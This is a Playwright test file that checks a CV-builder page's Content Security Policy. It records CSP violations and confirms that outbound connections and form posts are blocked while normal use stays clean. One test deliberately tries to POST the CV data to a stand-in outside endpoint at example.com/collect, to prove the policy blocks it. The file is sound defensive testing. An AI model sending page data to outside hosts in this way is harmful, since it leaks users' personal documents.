import { expect, test } from "@playwright/test";
import { downloadAs, open } from "./helpers.ts";

test.beforeEach(async ({ page }) => {
  // Record every CSP violation from the first script on.
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) =>
      w.__csp.push(`${e.effectiveDirective} ${e.blockedURI}`),
    );
  });
});

const violations = (page: import("@playwright/test").Page) =>
  page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

test("the page may not send data to other sites", async ({ page }) => {
  await open(page);
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(policy).toContain("connect-src 'self'");
  expect(policy).toContain("form-action 'none'");

  const outcome = await page.evaluate(() =>
    fetch("https://example.com/collect", { method: "POST", body: "cv" }).then(
      () => "sent",
      () => "blocked",
    ),
  );
  expect(outcome).toBe("blocked");
  expect(await violations(page)).toEqual(["connect-src https://example.com/collect"]);
});

test("normal use triggers no CSP violations", async ({ page }) => {
  await open(page);
  await page.getByLabel("Theme").selectOption("classic");
  await expect(page.locator(".status")).toContainText("Up to date");
  const download = await downloadAs(page, "docx");
  expect(download.suggestedFilename()).toBe("cv.docx");
  expect(await violations(page)).toEqual([]);
});
